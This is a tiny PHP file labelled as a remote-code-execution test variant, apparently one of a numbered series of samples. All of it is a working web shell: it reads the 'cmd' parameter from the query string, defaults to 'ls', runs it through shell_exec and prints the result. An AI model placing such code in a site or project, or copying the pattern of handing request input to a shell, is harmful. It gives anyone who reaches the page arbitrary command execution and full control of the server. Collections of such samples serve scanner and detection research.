<?php
// RCE test variation #1038
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>